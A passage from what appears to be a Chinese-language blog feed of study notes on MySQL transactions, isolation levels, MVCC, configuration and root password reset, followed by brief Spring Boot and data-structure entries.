class="number">3</span>、隔离性（Isolation）：同一时刻，只允许一个事务请求同一数据，不同的事务之间彼此没有任何干扰。比如<span class="keyword">A</span>正在从一张银行卡中取钱，在<span class="keyword">A</span>取钱的过程结束前，B不能向这张卡转账。</span><br><span class="line">　　 </span><br><span class="line">　　 <span class="number">4</span>、持久性（Durability）：事务完成后，事务对数据库的所有更新将被保存到数据库，不能回滚。</span><br><span class="line">　　 </span><br><span class="line">B、事务的并发问题</span><br><span class="line"></span><br><span class="line">　　<span class="number">1</span>、脏读：事务<span class="keyword">A</span>读取了事务B更新的数据，然后B回滚操作，那么<span class="keyword">A</span>读取到的数据是脏数据</span><br><span class="line">　</span><br><span class="line">　　<span class="number">2</span>、不可重复读：事务<span class="keyword">A</span>不同阶段多次读取同一数据，事务B在事务<span class="keyword">A</span>多次读取的过程中，对该数据进行变更，导致事务<span class="keyword">A</span>多次读取同一数据时，结果不一致。</span><br><span class="line">　　</span><br><span class="line">　　<span class="number">3</span>、幻读：事务<span class="keyword">A</span>读取到本不该出现事务B提交的新数据，出现貌似幻觉</span><br></pre></td></tr></table></figure><h3 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h3><ol><li>定义</li></ol><p>原子性是指一个事务是一个不可分割的工作单位，其中的操作要么都做，要么都不做；如果事务中一个sql语句执行失败，则已执行的语句也必须回滚，数据库退回到事务前的状态。</p><ol start="2"><li>实现原理：undo log</li></ol><p>在说明原子性原理之前，首先介绍一下MySQL的事务日志。MySQL的日志有很多种，如二进制日志、错误日志、查询日志、慢查询日志等，此外InnoDB存储引擎还提供了两种事务日志：redo log(重做日志)和undo log(回滚日志)。其中redo log用于保证事务持久性；undo log则是事务原子性和隔离性实现的基础。</p><p>下面说回undo log。实现原子性的关键，是当事务回滚时能够撤销所有已经成功执行的sql语句。<strong>InnoDB**</strong>实现回滚，靠的是undo log<strong><strong>：当事务对数据库进行修改时，InnoDB</strong></strong>会生成对应的undo log<strong><strong>；如果事务执行失败或调用了rollback</strong></strong>，导致事务需要回滚，便可以利用undo log<strong>**中的信息将数据回滚到修改之前的样子。</strong></p><p>undo log属于逻辑日志，它记录的是sql执行相关的信息。当发生回滚时，InnoDB会根据undo log的内容做与之前相反的工作：对于每个insert，回滚时会执行delete；对于每个delete，回滚时会执行insert；对于每个update，回滚时会执行一个相反的update，把数据改回去。</p><p>以update操作为例：当事务执行update时，其生成的undo log中会包含被修改行的主键(以便知道修改了哪些行)、修改了哪些列、这些列在修改前后的值等信息，回滚时便可以使用这些信息将数据还原到update之前的状态。</p><p>``</p><h3 id="持久性"><a href="#持久性" class="headerlink" title="持久性"></a>持久性</h3><ol><li><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4></li></ol><p>持久性是指事务一旦提交, 它对数据库的改变就是永久性的. 接下来的其它操作或故障不应该对其有任何影响 </p><ol start="2"><li><h4 id="实现原理-redo-log"><a href="#实现原理-redo-log" class="headerlink" title="实现原理 : redo log"></a>实现原理 : redo log</h4></li></ol><p>redo log和undo log都属于InnoDB的事务日志。下面先聊一下redo log存在的背景。</p><p>InnoDB作为MySQL的存储引擎，数据是存放在磁盘中的，但如果每次读写数据都需要磁盘IO，效率会很低。为此，InnoDB提供了缓存(Buffer Pool)，Buffer Pool中包含了磁盘中部分数据页的映射，作为访问数据库的缓冲：当从数据库读取数据时，会首先从Buffer Pool中读取，如果Buffer Pool中没有，则从磁盘读取后放入Buffer Pool；当向数据库写入数据时，会首先写入Buffer Pool，Buffer Pool中修改的数据会定期刷新到磁盘中（这一过程称为刷脏）。</p><p>Buffer Pool的使用大大提高了读写数据的效率，但是也带了新的问题：如果MySQL宕机，而此时Buffer Pool中修改的数据还没有刷新到磁盘，就会导致数据的丢失，事务的持久性无法保证。</p><p>于是，redo log被引入来解决这个问题：当数据修改时，除了修改Buffer Pool中的数据，还会在redo log记录这次操作；当事务提交时，会调用fsync接口对redo log进行刷盘。如果MySQL宕机，重启时可以读取redo log中的数据，对数据库进行恢复。redo log采用的是WAL（Write-ahead logging，预写式日志），所有修改先写入日志，再更新到Buffer Pool，保证了数据不会因MySQL宕机而丢失，从而满足了持久性要求。</p><p>既然redo log也需要在事务提交时将日志写入磁盘，为什么它比直接将Buffer Pool中修改的数据写入磁盘(即刷脏)要快呢？主要有以下两方面的原因：</p><p>（1）刷脏是随机IO，因为每次修改的数据位置随机，但写redo log是追加操作，属于顺序IO。</p><p>（2）刷脏是以数据页（Page）为单位的，MySQL默认页大小是16KB，一个Page上一个小修改都要整页写入；而redo log中只包含真正需要写入的部分，无效IO大大减少。</p><ol start="3"><li><h4 id="redo-log-与binlog"><a href="#redo-log-与binlog" class="headerlink" title="redo log 与binlog"></a>redo log 与binlog</h4></li></ol><p>我们知道，在MySQL中还存在binlog(二进制日志)也可以记录写操作并用于数据的恢复，但二者是有着根本的不同的：</p><p>（1）作用不同：redo log是用于crash recovery的，保证MySQL宕机也不会影响持久性；binlog是用于point-in-time recovery的，保证服务器可以基于时间点恢复数据，此外binlog还用于主从复制。</p><p>（2）层次不同：redo log是InnoDB存储引擎实现的，而binlog是MySQL的服务器层(可以参考文章前面对MySQL逻辑架构的介绍)实现的，同时支持InnoDB和其他存储引擎。</p><p>（3）内容不同：redo log是物理日志，内容基于磁盘的Page；binlog的内容是二进制的，根据binlog_format参数的不同，可能基于sql语句、基于数据本身或者二者的混合。</p><p>（4）写入时机不同：binlog在事务提交时写入；redo log的写入时机相对多元：</p><ul><li>前面曾提到：当事务提交时会调用fsync对redo log进行刷盘；这是默认情况下的策略，修改innodb_flush_log_at_trx_commit参数可以改变该策略，但事务的持久性将无法保证。</li><li>除了事务提交时，还有其他刷盘时机：如master thread每秒刷盘一次redo log等，这样的好处是不一定要等到commit时刷盘，commit速度大大加快。</li></ul><h3 id="隔离性"><a href="#隔离性" class="headerlink" title="隔离性"></a>隔离性</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p><strong>与原子性、持久性侧重于研究事务本身不同，隔离性研究的是不同事务之间的相互影响。</strong>隔离性是指，事务内部的操作与其他事务是隔离的，并发执行的各个事务之间不能互相干扰。严格的隔离性，对应了事务隔离级别中的Serializable (可串行化)，但实际应用中出于性能方面的考虑很少会使用可串行化。</p><p>隔离性追求的是并发情形下事务之间互不干扰。简单起见，我们主要考虑最简单的读操作和写操作(加锁读等特殊读操作会特殊说明)，那么隔离性的探讨，主要可以分为两个方面：</p><ul><li>(一个事务)写操作对(另一个事务)写操作的影响：锁机制保证隔离性</li><li>(一个事务)写操作对(另一个事务)读操作的影响：MVCC保证隔离性</li></ul><h4 id="锁机制-1"><a href="#锁机制-1" class="headerlink" title="锁机制"></a>锁机制</h4><p>在上面</p><h4 id="脏读-不可重复读和幻读"><a href="#脏读-不可重复读和幻读" class="headerlink" title="脏读 , 不可重复读和幻读"></a>脏读 , 不可重复读和幻读</h4><p>首先来看并发情况下，读操作可能存在的三类问题：</p><p>（1）脏读：当前事务(A)中可以读到其他事务(B)未提交的数据（脏数据），这种现象是脏读。举例如下（以账户余额表为例）：</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128201003630-2050662608.png" alt="img"></p><p>（2）不可重复读：在事务A中先后两次读取同一个数据，两次读取的结果不一样，这种现象称为不可重复读。脏读与不可重复读的区别在于：前者读到的是其他事务未提交的数据，后者读到的是其他事务已提交的数据。举例如下：</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128201011603-1317894910.png" alt="img"></p><p>（3）幻读：在事务A中按照某个条件先后两次查询数据库，两次查询结果的条数不同，这种现象称为幻读。不可重复读与幻读的区别可以通俗的理解为：前者是数据变了，后者是数据的行数变了。举例如下：</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128201021606-1089980279.png" alt="img"></p><h3 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a>事务隔离级别</h3><p>SQL标准中定义了四种隔离级别，并规定了每种隔离级别下上述几个问题是否存在。一般来说，隔离级别越低，系统开销越低，可支持的并发越高，但隔离性也越差。隔离级别与读问题的关系如下：</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128201034603-681355962.png" alt="img"></p><p>在实际应用中，<strong>读未提交</strong>在并发时会导致很多问题，而性能相对于其他隔离级别提高却很有限，因此使用较少。<strong>可串行化</strong>强制事务串行，并发效率很低，只有当对数据一致性要求极高且可以接受没有并发时使用，因此使用也较少。因此在大多数数据库系统中，默认的隔离级别是<strong>读已提交**</strong>(<strong>**如Oracle)</strong>或<strong>可重复读（后文简称**</strong>RR<strong>**）</strong>。</p><p>可以通过如下两个命令分别查看全局隔离级别和本次会话的隔离级别：</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128201103652-719570401.png" alt="img"></p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128201111615-210490190.png" alt="img"></p><p>InnoDB默认的隔离级别是RR，后文会重点介绍RR。需要注意的是，在SQL标准中，RR是无法避免幻读问题的，但是InnoDB实现的RR避免了幻读问题。</p><h3 id="MVCC"><a href="#MVCC" class="headerlink" title="MVCC"></a>MVCC</h3><p>RR解决脏读、不可重复读、幻读等问题，使用的是MVCC：MVCC全称Multi-Version Concurrency Control，即多版本的并发控制协议。下面的例子很好的体现了MVCC的特点：在同一时刻，不同的事务读取到的数据可能是不同的(即多版本)——在T5时刻，事务A和事务C可以读取到不同版本的数据。</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128201126604-235257040.png" alt="img"></p><p>MVCC最大的优点是读不加锁，因此读写不冲突，并发性能好。InnoDB实现MVCC，多个版本的数据可以共存，主要基于以下技术及数据结构：</p><p>1）隐藏列：InnoDB中每行数据都有隐藏列，隐藏列中包含了本行数据的事务id、指向undo log的指针等。</p><p>2）基于undo log的版本链：前面说到每行数据的隐藏列中包含了指向undo log的指针，而每条undo log也会指向更早版本的undo log，从而形成一条版本链。</p><p>3）ReadView：通过隐藏列和版本链，MySQL可以将数据恢复到指定版本；但是具体要恢复到哪个版本，则需要根据ReadView来确定。所谓ReadView，是指事务（记做事务A）在某一时刻给整个事务系统（trx_sys）打快照，之后再进行读操作时，会将读取到的数据中的事务id与trx_sys快照比较，从而判断数据对该ReadView是否可见，即对事务A是否可见。</p><p>trx_sys中的主要内容，以及判断可见性的方法如下：</p><ul><li>low_limit_id：表示生成ReadView时系统中应该分配给下一个事务的id。如果数据的事务id大于等于low_limit_id，则对该ReadView不可见。</li><li>up_limit_id：表示生成ReadView时当前系统中活跃的读写事务中最小的事务id。如果数据的事务id小于up_limit_id，则对该ReadView可见。</li><li>rw_trx_ids：表示生成ReadView时当前系统中活跃的读写事务的事务id列表。如果数据的事务id在low_limit_id和up_limit_id之间，则需要判断事务id是否在rw_trx_ids中：如果在，说明生成ReadView时事务仍在活跃中，因此数据对ReadView不可见；如果不在，说明生成ReadView时事务已经提交了，因此数据对ReadView可见。</li></ul><p>下面以RR隔离级别为例，结合前文提到的几个问题分别说明。</p><p>（1）脏读</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128201139635-1779107964.png" alt="img"></p><p>当事务A在T3时刻读取zhangsan的余额前，会生成ReadView，由于此时事务B没有提交仍然活跃，因此其事务id一定在ReadView的rw_trx_ids中，因此根据前面介绍的规则，事务B的修改对ReadView不可见。接下来，事务A根据指针指向的undo log查询上一版本的数据，得到zhangsan的余额为100。这样事务A就避免了脏读。</p><p>（2）不可重复读</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128201149661-1275460669.png" alt="img"></p><p>当事务A在T2时刻读取zhangsan的余额前，会生成ReadView。此时事务B分两种情况讨论，一种是如图中所示，事务已经开始但没有提交，此时其事务id在ReadView的rw_trx_ids中；一种是事务B还没有开始，此时其事务id大于等于ReadView的low_limit_id。无论是哪种情况，根据前面介绍的规则，事务B的修改对ReadView都不可见。</p><p>当事务A在T5时刻再次读取zhangsan的余额时，会根据T2时刻生成的ReadView对数据的可见性进行判断，从而判断出事务B的修改不可见；因此事务A根据指针指向的undo log查询上一版本的数据，得到zhangsan的余额为100，从而避免了不可重复读。</p><p>（3）幻读</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128201206609-1998192060.png" alt="img"></p><p>MVCC避免幻读的机制与避免不可重复读非常类似。</p><p>当事务A在T2时刻读取0&lt;id&lt;5的用户余额前，会生成ReadView。此时事务B分两种情况讨论，一种是如图中所示，事务已经开始但没有提交，此时其事务id在ReadView的rw_trx_ids中；一种是事务B还没有开始，此时其事务id大于等于ReadView的low_limit_id。无论是哪种情况，根据前面介绍的规则，事务B的修改对ReadView都不可见。</p><p>当事务A在T5时刻再次读取0&lt;id&lt;5的用户余额时，会根据T2时刻生成的ReadView对数据的可见性进行判断，从而判断出事务B的修改不可见。因此对于新插入的数据lisi(id=2)，事务A根据其指针指向的undo log查询上一版本的数据，发现该数据并不存在，从而避免了幻读。</p><h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p>前面介绍的MVCC，是RR隔离级别下“非加锁读”实现隔离性的方式。下面是一些简单的扩展。</p><p>（1）读已提交（RC）隔离级别下的非加锁读</p><p>RC与RR一样，都使用了MVCC，其主要区别在于：</p><p>RR是在事务开始后第一次执行select前创建ReadView，直到事务提交都不会再创建。根据前面的介绍，RR可以避免脏读、不可重复读和幻读。</p><p>RC每次执行select前都会重新建立一个新的ReadView，因此如果事务A第一次select之后，事务B对数据进行了修改并提交，那么事务A第二次select时会重新建立新的ReadView，因此事务B的修改对事务A是可见的。因此RC隔离级别可以避免脏读，但是无法避免不可重复读和幻读。</p><p>（2）加锁读与next-key lock</p><p>按照是否加锁，MySQL的读可以分为两种：</p><p>一种是非加锁读，也称作快照读、一致性读，使用普通的select语句，这种情况下使用MVCC避免了脏读、不可重复读、幻读，保证了隔离性。</p><p>另一种是加锁读，查询语句有所不同，如下所示：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#共享锁读取``<span class="keyword">select</span><span class="symbol">``</span>...lock <span class="symbol">``</span><span class="keyword">in</span><span class="symbol">` `</span>share mode<span class="symbol">``</span>#排它锁读取<span class="symbol">``</span><span class="keyword">select</span><span class="symbol">``</span>...<span class="symbol">``</span><span class="keyword">for</span><span class="symbol">` `</span><span class="keyword">update</span></span><br></pre></td></tr></table></figure><p>加锁读在查询时会对查询的数据加锁（共享锁或排它锁）。由于锁的特性，当某事务对数据进行加锁读后，其他事务无法对数据进行写操作，因此可以避免脏读和不可重复读。而避免幻读，则需要通过next-key lock。<strong>next-key lock**</strong>是行锁的一种，实现相当于<strong><strong>record lock(</strong></strong>记录锁<strong><strong>) + gap lock(</strong></strong>间隙锁<strong><strong>)</strong></strong>；其特点是不仅会锁住记录本身<strong><strong>(record lock</strong></strong>的功能<strong><strong>)</strong></strong>，还会锁定一个范围<strong><strong>(gap lock</strong></strong>的功能<strong><strong>)</strong></strong>。**因此，加锁读同样可以避免脏读、不可重复读和幻读，保证隔离性。</p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>概括来说，InnoDB实现的RR，通过锁机制（包含next-key lock）、MVCC（包括数据的隐藏列、基于undo log的版本链、ReadView）等，实现了一定程度的隔离性，可以满足大多数场景的需要。</p><p>不过需要说明的是，RR虽然避免了幻读问题，但是毕竟不是Serializable，不能保证完全的隔离，下面是两个例子：</p><p>第一个例子，如果在事务中第一次读取采用非加锁读，第二次读取采用加锁读，则如果在两次读取之间数据发生了变化，两次读取到的结果不一样，因为加锁读时不会采用MVCC。</p><p>第二个例子，如下所示，大家可以自己验证一下。</p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/1174710-20190128201219610-1942897077.png" alt="img"></p><h3 id="锁表"><a href="#锁表" class="headerlink" title="锁表"></a>锁表</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、事务隔离级别是可重复读时，并不会锁住读取到的行，如果有索引（包括主键索引）的时候，以索引列为条件更新数据，</span><br><span class="line">     </span><br><span class="line">    会存在间隙锁间隙锁、行锁、下一键锁的问题，从而锁住一些行；如果没有索引，更新数据时会锁住整张表。</span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>、事务隔离级别为读未提交时，写数据只会锁住相应的行</span><br><span class="line"> </span><br><span class="line"><span class="number">3</span>、事务隔离级别为串行化时，读写数据都会锁住整张表</span><br><span class="line"> </span><br><span class="line">注：隔离级别越高，越能保证数据的完整性和一致性，但是对并发性能的影响也越大。</span><br><span class="line">     </span><br><span class="line">    对于多数应用程序，可以优先考虑把数据库系统的隔离级别设为Read Committed，它能够避免脏读取，而且具有较好的并发性能。</span><br><span class="line">     </span><br><span class="line">    尽管它会导致不可重复读、幻读这些并发问题，在可能出现这类问题的个别场合，可以由应用程序采用悲观锁或乐观锁来控制。</span><br></pre></td></tr></table></figure><h3 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>一致性是指事务执行结束后，<strong>数据库的完整性约束没有被破坏，事务执行的前后都是合法的数据状态。</strong>数据库的完整性约束包括但不限于：实体完整性（如行的主键存在且唯一）、列完整性（如字段的类型、大小、长度要符合要求）、外键约束、用户自定义完整性（如转账前后，两个账户余额的和应该不变）。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>可以说，一致性是事务追求的最终目标：前面提到的原子性、持久性和隔离性，都是为了保证数据库状态的一致性。此外，除了数据库层面的保障，一致性的实现也需要应用层面进行保障。</p><p>实现一致性的措施包括：</p><ul><li>保证原子性、持久性和隔离性，如果这些特性无法保证，事务的一致性也无法保证</li><li>数据库本身提供保障，例如不允许向整形列插入字符串值、字符串长度不能超过列的限制等</li><li>应用层面进行保障，例如如果转账操作只扣除转账者的余额，而没有增加接收者的余额，无论数据库实现的多么完美，也无法保证状态的一致</li></ul><h3 id="操作配置"><a href="#操作配置" class="headerlink" title="操作配置"></a>操作配置</h3><p>方法一:  在my.inf 文件的[mysqld] 节里类似如下设置该选项</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transaction</span>-<span class="keyword">isolation</span> = &#123;<span class="keyword">READ</span>-<span class="keyword">UNCOMMITTED</span> | <span class="keyword">READ</span>-<span class="keyword">COMMITTED</span> | <span class="keyword">REPEATABLE</span>-<span class="keyword">READ</span> | <span class="keyword">SERIALIZABLE</span>&#125;</span><br></pre></td></tr></table></figure><p>方法二: 用SET TRANSACTION 语句改变单个会话或者所有新进连接的隔离级别 , 语法如下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> [<span class="keyword">SESSION</span> | <span class="keyword">GLOBAL</span>] <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> &#123;<span class="keyword">READ</span> <span class="keyword">UNCOMMITTED</span> | <span class="keyword">READ</span> <span class="keyword">COMMITTED</span> | <span class="keyword">REPEATABLE</span> <span class="keyword">READ</span> | <span class="keyword">SERIALIZABLE</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="navict"><a href="#navict" class="headerlink" title="navict"></a>navict</h2><p>at for mysql</p><p><strong>报错</strong></p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200910203442350.png" alt="image-20200910203442350"></p><p><strong>解决</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY ‘password&#39;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200910203614246.png" alt="image-20200910203614246"></p><p><img src="/images/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20201026174645717.png" alt="image-20201026174645717"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql/mysql_problem</title>
      <link href="mysql/mysql_problem/"/>
      <url>mysql/mysql_problem/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql-问题解决"><a href="#mysql-问题解决" class="headerlink" title="mysql 问题解决"></a>mysql 问题解决</h1><a id="more"></a><h2 id="Can’t-connect-to-MySQL-server-on-‘localhost’-10061-after-Installation"><a href="#Can’t-connect-to-MySQL-server-on-‘localhost’-10061-after-Installation" class="headerlink" title="Can’t connect to MySQL server on ‘localhost’ (10061) after Installation"></a><a href="https://stackoverflow.com/questions/10892689/cant-connect-to-mysql-server-on-localhost-10061-after-installation" target="_blank" rel="noopener">Can’t connect to MySQL server on ‘localhost’ (10061) after Installation</a></h2><p><a href="https://blog.csdn.net/ls0111/article/details/88777239" target="_blank" rel="noopener">参考文章-mysql解压版的安装</a></p><p>mysql解压版的需要在解压根目录创建一个文件my.ini</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="comment">#设置mysql客户端默认字符集</span></span><br><span class="line"><span class="attr">default-character-set</span>=utf8</span><br><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="comment">#设置3306端口</span></span><br><span class="line"><span class="attr">port</span>=<span class="number">3306</span></span><br><span class="line"><span class="comment">#设置mysql的安装目录</span></span><br><span class="line"><span class="attr">basedir</span>=D:\Program Files\mysql-<span class="number">8.0</span>.<span class="number">15</span>-winx64</span><br><span class="line"><span class="comment">#设置mysql数据库的数据的存放目录</span></span><br><span class="line"><span class="attr">datadir</span>=D:\Program Files\mysql-<span class="number">8.0</span>.<span class="number">15</span>-winx64\data</span><br><span class="line"><span class="comment">#允许最大连接数</span></span><br><span class="line"><span class="attr">max_connections</span>=<span class="number">20</span></span><br><span class="line"><span class="comment">#服务端使用的字符集默认为8比特编码的latin1字符集</span></span><br><span class="line"><span class="attr">character-set-server</span>=utf8</span><br><span class="line"><span class="comment">#创建新表时将使用的默认存储引擎</span></span><br><span class="line"><span class="attr">default-storage-engine</span>=INNODB</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「ls0111」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https://blog.csdn.net/ls0111/java/article/details/88777239</span><br></pre></td></tr></table></figure><h3 id="在Windows服务中检查MYSQL服务。如果它在那里并且没有运行，则启动它。它将解决您的问题。"><a href="#在Windows服务中检查MYSQL服务。如果它在那里并且没有运行，则启动它。它将解决您的问题。" class="headerlink" title="在Windows服务中检查MYSQL服务。如果它在那里并且没有运行，则启动它。它将解决您的问题。"></a>在Windows服务中检查<strong>MYSQL</strong>服务。如果它在那里并且没有运行，则启动它。它将解决您的问题。</h3><p>您可以通过导航至Windows的“开始”菜单并在搜索栏中键入“服务”来找到服务窗口。选择旁边带有齿轮的“服务”选项（不是可执行文件），将出现以下窗口。向下滚动以查找“ MySql（版本）”。当选择MySql时，您应该在左窗格中看到一个“启动服务”选项。单击此按钮，将出现一个对话框，指示Windows正在尝试启动该服务。一旦启动，左侧窗格现在将为您提供停止，暂停和重新启动服务的选项，您现在将能够从Windows cmd行连接到MySql。</p><p><a href="https://i.stack.imgur.com/Vxegx.png" target="_blank" rel="noopener"><img src="../images/mysql_problem/Vxegx.png" alt="在此处输入图片说明"></a></p><h3 id="如果Windows服务中不存在MYSQL服务，请遵循以下设置。"><a href="#如果Windows服务中不存在MYSQL服务，请遵循以下设置。" class="headerlink" title="如果Windows服务中不存在MYSQL服务，请遵循以下设置。"></a>如果Windows服务中不存在MYSQL服务，请遵循以下设置。</h3><p>一个。以管理员身份打开cmd。</p><p>b。cd到<strong>C：\ Program Files（x86）\ MySQL \ MySQL Server 5.6 \ bin</strong></p><p>C。运行命令： <strong>C：\ Program Files（x86）\ MySQL \ MySQL Server 5.6 \ bin&gt; mysqld.exe –install</strong></p><p>d。检查Windows服务中的MySql，如果它没有运行，请单击该服务以启动它。</p><p>e。如果您使用XAMMP。在XAMMP控制面板上启动MySQL。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql/mysql_passwd</title>
      <link href="mysql/mysql_passwd/"/>
      <url>mysql/mysql_passwd/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql-root-密码修改"><a href="#mysql-root-密码修改" class="headerlink" title="mysql root 密码修改"></a>mysql root 密码修改</h1><a id="more"></a><p>服务器配置 ：centos 8.0 </p><p>安装 ：mysql完整版</p><p>需要的可以到mysql官网下载 ： <a href="http://repo.mysql.com/" target="_blank" rel="noopener">地址</a></p><p>主要记录mysqlroot 密码修改  因为本人第一次登陆的时候并没有填写密码，所以在/var/log/mysql/mysqld.log 里面没有记录默认密码</p><p>mysqld.log 的位置不一定相同   具体请使用<strong>whereis mysqld.log</strong> 查看</p><h2 id="修改过程"><a href="#修改过程" class="headerlink" title="修改过程"></a>修改过程</h2><p>首先查看 /etc/my,cnf 配置文件  跟别人并不相同</p><p><img src="/mysql_passwd/image-20200313111818586.png" alt="image-20200313111818586"></p><p>没有更多限制</p><p>直接使用 mysql可以进行登陆</p><p>推荐使用mysql -uroot -p</p><p><img src="/mysql_passwd/image-20200313111951067.png" alt="image-20200313111951067"></p><p>在你的mysql.log 没有密码时 直接回车键登陆</p><p>登陆后执行</p><p><img src="/mysql_passwd/image-20200313112116077.png" alt="image-20200313112116077"></p><p>alter user ’root’@’lcalhost’  identified by ‘your password’ ;</p><p>执行成功</p><p><img src="/mysql_passwd/image-20200313112231036.png" alt="image-20200313112231036"></p><p>下面再使用mysql  会出现报错</p><p><img src="/mysql_passwd/image-20200313112300320.png" alt="image-20200313112300320"></p><p>因为这时mysql root已经设置密码</p><p>所以需要使用 mysql -uroot -p 登陆，并输入密码</p><p><img src="/mysql_passwd/image-20200313112415907.png" alt="image-20200313112415907"></p><p>登陆成功</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/项目开发</title>
      <link href="java/%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/"/>
      <url>java/%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="写boot项目"><a href="#写boot项目" class="headerlink" title="写boot项目"></a>写boot项目</h1><a id="more"></a><h2 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h2><h3 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h3><p>验证用户是否存在</p><p>获取token  </p><p>做登陆持久化, 负责保持用户的登陆状态 </p><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><p><a href="https://learnku.com/articles/35566" target="_blank" rel="noopener">参考boot集成jwt实现验证</a></p><p>拦截请求, 定义访问页面所需要的权限 </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/数据结构</title>
      <link href="java/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>java/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><a id="more"></a><p>[TOC]</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><h3 id="剑指Offer-No-09"><a href="#剑指Offer-No-09" class="headerlink" title="剑指Offer No.09"></a>剑指Offer No.09</h3><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p>多数算法以树结构为框架 </p><h3 id="二叉树遍历框架"><a href="#二叉树遍历框架" class="headerlink" title="二叉树遍历框架"></a>二叉树遍历框架</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void <span class="constructor">BST(TreeNode <span class="params">root</span>, <span class="params">int</span> <span class="params">target</span>)</span> &#123;</span><br><span class="line">    